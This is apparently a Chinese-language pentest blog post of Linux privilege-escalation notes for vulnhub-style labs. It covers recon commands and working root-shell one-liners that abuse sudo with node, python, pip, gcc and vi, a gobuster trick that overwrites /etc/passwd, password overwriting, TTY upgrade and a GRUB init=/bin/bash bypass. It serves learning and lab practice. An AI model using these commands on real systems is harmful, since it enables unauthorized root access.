---
title: Linux笔记
published: 2025-03-01
pinned: false
description: A simple example of a Markdown blog post.
tags: ['笔记']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-03-01
pubDate: 2025-03-01
---


## linux提权

### 信息收集

> hostname

hostname命令将返回目标计算机的主机名。尽管该值可以很容易地更改或具有相对无意义的字符串（例如 Ubuntu-3487340239），但在某些情况下，它可以提供有关目标系统在企业网络中的角色的信息

> uname -a

将打印系统信息，为我们提供有关系统使用的内核的更多详细信息。这在搜索任何可能导致权限升级的潜在内核漏洞(searchsploit)时非常有用。

> /proc/version

proc 文件系统 (procfs) 提供有关目标系统进程的信息。您会在许多不同的Linux版本中找到 proc，这使其成为您的工具库中必不可少的工具。
查看/proc/version 可能会为您提供有关内核版本的信息以及其他数据，例如是否安装了编译器（例如 GCC）。

> /etc/issue

可以通过查看/etc/issue文件来识别系统。该文件通常包含一些有关操作系统的信息，但可以轻松自定义或更改。在这个主题上，任何包含系统信息的文件都可以定制或更改。为了更清楚地了解系统，最好查看所有这些内容。

> ps

s命令是查看Linux系统上正在运行的进程的有效方法。
在终端上输入ps将显示当前 shell 的进程。

<li>ps -a查看所有正在运行的进程
<li>ps axjf查看进程树

<li>ps aux aux选项将显示所有用户的进程 (a)、显示启动进程的用户 (u) 以及显示未连接到终端的进程 (x)。查看ps aux命令的输出，我们可以更好地了解系统和潜在的漏洞

> env

env命令将显示环境变量。
PATH 变量可能具有编译器或脚本语言（例如Python），可用于在目标系统上运行代码或用于权限升级。

> sudo -l

目标系统可以配置为允许用户以 root 权限运行某些（或全部）命令。 sudo -l命令可用于列出用户可以使用sudo运行的所有命令

> id

id命令将显示当前用户的身份信息。也可以显示是否磁盘挂载

> /etc/passwd

/etc/passwd文件包含有关所有用户帐户的信息。但是读的很慢，而且一堆信息可能没用，有用的都在/home下

> history

使用history命令查看早期命令可以让我们了解目标系统，并且（尽管很少）存储了密码或用户名等信息。

> ifconfig

ifconfig命令将显示网络接口的信息。ip a也可以，ip route命令可以查看存在哪些网络路由

> find

以下是“查找”命令的一些有用示例。

- `find . -name flag1.txt`: 在当前目录中查找名为 "flag1.txt" 的文件
- `find /home -name flag1.txt`: 在 `/home` 目录中查找名为 "flag1.txt" 的文件
- `find / -type d -name config`: 在根目录 `/` 下查找名为 "config" 的目录
- `find / -type f -perm 0777`: 查找具有 777 权限（所有用户均可读、写、执行）的文件
- `find / -perm a=x`: 查找可执行文件
- `find /home -user frank`: 在 `/home` 目录下查找属于用户 "frank" 的所有文件
- `find / -mtime 10`: 查找过去 10 天内修改过的文件
- `find / -atime 10`: 查找过去 10 天内访问过的文件
- `find / -cmin -60`: 查找在过去一小时（60 分钟）内更改过的文件
- `find / -amin -60`: 查找在过去一小时（60 分钟）内访问过的文件
- `find / -size 50M`: 查找大小为 50 MB 的文件

值得注意的是，“find”命令往往会产生错误，有时会导致输出难以阅读。这就是为什么明智的做法是使用“find”命令和“`-type f 2>/dev/null`”将错误重定向到“`/dev/null`”并获得更清晰的输出。

- `find / -writable -type d 2>/dev/null`: 查找全局可写文件夹
- `find / -perm -222 -type d 2>/dev/null`: 查找全局可写文件夹
- `find / -perm -o w -type d 2>/dev/null`: 查找全局可写文件夹
- `find / -perm -o x -type d 2>/dev/null`: 查找全局可执行文件夹

查找开发工具和支持的语言：

- `find / -name perl*`
- `find / -name python*`
- `find / -name gcc*`

查找特定文件权限：

- `find / -perm -u=s -type f 2>/dev/null`: 查找带有SUID位的文件，它允许我们以比当前用户更高的权限级别运行该文件。

### 自动化工具

- [linPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LES](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [pspy](https://github.com/DominicBreuker/pspy)
- [hack网站](https://book.hacktricks.wiki/en/index.html)

(使用方法自己看一眼就知道了)

### 常见提权方式(只写一些经常遇到的)

#### 内核漏洞

kali有集成工具searchsploit，输入版本号去找就行，然后上传到靶机里面

#### sudo提权

> sudo node -e 'child_process.spawn("/bin/bash",{stdio: [0,1,2]})'

#### gobuster提权

```#kali
perl -e 'print crypt("1","aa")'

cat a.py
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    if len(path) == 36:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)

python a.py
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:80
 * Running on http://192.168.64.3:80
Press CTRL+C to quit

#靶机
echo 'aaa:aacFCuAIHhrCM:0:0:x:/root:/bin/bash' > aaa
sudo /usr/bin/gobuster -w aaa -u http://192.168.64.3 -n -q -o /etc/passwd
cat /etc/passwd
su - /aaa
```

#### 直接写入

有些时候sudo -l你会发现可执行的是个可写入文件，那直接写入/bin/bash去提权即可
又如python可以直接执行时

```
sudo /usr/bin/python3 -c 'import os;os.execl("/bin/sh","sh","-p")'
```

#### pip提权

```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip install $TF
```

#### 写入密码

当/etc/passwd可以写入的时候，可以把root的密码设置为空，或者是openssl passwd -1去生成密码，把root的密码改了

#### gcc提权

```
sudo gcc -wrapper /bin/sh,-s .
```

#### vi逃逸

前提就是可以root执行vi，直接打开vi写入:!sh，本质是打开了一个shell

### 常用挤巧

#### 文件上传or下载

个人常用sftp

```
1.SFTP建立连接
sftp username@ip

2.上传
上去之后直接put

3.下载
上去之后直接get，或者是mget * 可以得到当前目录下的全部文件
```

还有一个方法，本地利用python起一个服务，靶机利用wget下载

```
python3 -m http.server 80
```

#### shell

当你反弹shell准备提权，发现shell不是交互式的

```
/usr/bin/script -qc /bin/bash /dev/null
```

直接一步到位

#### 靶机网卡配置

如果扫不到就按照下面操作

1. 在Linux镜像成功安装后启动，连续按e进入编辑模式，修改ro及其后面信息为rw single init=/bin/bash免密进入系统。
2. Ctrl+X进行保存(Mac为Control+X)进入系统。

3. 进入系统后，ip addr查看当前网卡信息，可以看到这里存在两个网卡，一个是lo回环网卡，另一个则是我们当前虚拟机设定使用的网卡(比如enp0s1)

4. 如果是Ubuntu < 20.04版本，则通过`vi /etc/network/interfaces`修改该靶场的网卡名enp0s3为上面的enp0s1。如果Ubuntu >= 20.04，则`vi nn fxxxx.yaml`进行修改。如果是CentOS，则在`/etc/sysconfig/network-scripts/ifcfg-xxx`中进行类似修改

注：常用于vulnhub靶场
